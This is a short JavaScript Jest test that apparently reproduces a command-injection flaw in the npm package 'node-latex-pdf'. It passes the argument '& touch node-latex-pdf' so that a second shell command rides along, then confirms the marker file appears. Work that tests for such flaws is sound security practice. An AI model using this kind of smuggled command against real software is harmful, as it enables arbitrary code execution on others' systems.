const v29 = done => {
    const v16 = expect.assertions(2);
    v16;
    const a = require('node-latex-pdf');
    const fs = require('fs');
    const path = './node-latex-pdf';
    try {
        const v17 = fs.existsSync(path);
        if (v17) {
            const v18 = fs.unlinkSync(path);
            v18;
            const v19 = console.log('File removed:', path);
            v19;
        }
    } catch (err) {
        const v20 = console.error(err);
        v20;
    }
    file_exist = fs.existsSync(path);
    const v21 = expect(file_exist);
    const v22 = v21.toBe(false);
    v22;
    const v27 = function () {
        file_exist = fs.existsSync(path);
        const v23 = expect(file_exist);
        const v24 = v23.toBe(true);
        v24;
        const v25 = fs.unlinkSync(path);
        v25;
        const v26 = done();
        v26;
    };
    const v28 = a('./', '& touch node-latex-pdf', v27);
    v28;
};
const v30 = test('Command Injection in node-latex-pdf', v29);
v30;